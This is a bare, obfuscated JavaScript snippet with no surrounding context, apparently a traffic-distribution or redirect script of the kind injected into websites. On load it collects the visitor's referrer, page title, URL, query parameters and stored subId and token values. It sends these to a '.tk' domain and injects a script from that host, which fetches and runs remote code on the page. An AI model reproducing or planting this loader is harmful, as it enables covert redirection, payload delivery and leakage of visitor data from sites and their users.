    (function() {
    var name = '_rmS4PR5j3sdvTfx8';
    if (!window._rmS4PR5j3sdvTfx8) {
        window._rmS4PR5j3sdvTfx8 = {
            unique: false,
            ttl: 86400,
            R_PATH: 'https://perneyledisrio.tk/fashionnetworks',
            P_PATH: 'https://perneyledisrio.tk/fec84ce/postback',
        };
    }
    const _BDP5g9qvYqjFcgjv = localStorage.getItem('config');
    if (typeof _BDP5g9qvYqjFcgjv !== 'undefined' && _BDP5g9qvYqjFcgjv !== null) {
        var _dzyXMrXxqmF8F43H = JSON.parse(_BDP5g9qvYqjFcgjv);
        var _Jc6mT7rQTPyzzgdf = Math.round(+new Date()/1000);
        if (_dzyXMrXxqmF8F43H.created_at + window._rmS4PR5j3sdvTfx8.ttl < _Jc6mT7rQTPyzzgdf) {
            localStorage.removeItem('subId');
            localStorage.removeItem('token');
            localStorage.removeItem('config');
        }
    }
    var _bxQvn2KBGq2TTxpb = localStorage.getItem('subId');
    var _Gffh8vLPY7dvrmFf = localStorage.getItem('token');
    var _vtSXtgZkLTfTxNts = '?return=js.client';
        _vtSXtgZkLTfTxNts += '&' + decodeURIComponent(window.location.search.replace('?', ''));
        _vtSXtgZkLTfTxNts += '&se_referrer=' + encodeURIComponent(document.referrer);
        _vtSXtgZkLTfTxNts += '&default_keyword=' + encodeURIComponent(document.title);
        _vtSXtgZkLTfTxNts += '&landing_url=' + encodeURIComponent(document.location.hostname + document.location.pathname);
        _vtSXtgZkLTfTxNts += '&name=' + encodeURIComponent(name);
        _vtSXtgZkLTfTxNts += '&host=' + encodeURIComponent(window._rmS4PR5j3sdvTfx8.R_PATH);
    if (typeof _bxQvn2KBGq2TTxpb !== 'undefined' && _bxQvn2KBGq2TTxpb && window._rmS4PR5j3sdvTfx8.unique) {
        _vtSXtgZkLTfTxNts += '&sub_id=' + encodeURIComponent(_bxQvn2KBGq2TTxpb);
    }
    if (typeof _Gffh8vLPY7dvrmFf !== 'undefined' && _Gffh8vLPY7dvrmFf && window._rmS4PR5j3sdvTfx8.unique) {
        _vtSXtgZkLTfTxNts += '&token=' + encodeURIComponent(_Gffh8vLPY7dvrmFf);
    }
    var a = document.createElement('script');
        a.type = 'application/javascript';
        a.src = window._rmS4PR5j3sdvTfx8.R_PATH + _vtSXtgZkLTfTxNts;
    var s = document.getElementsByTagName('script')[0];
    s.parentNode.insertBefore(a, s)
    })();
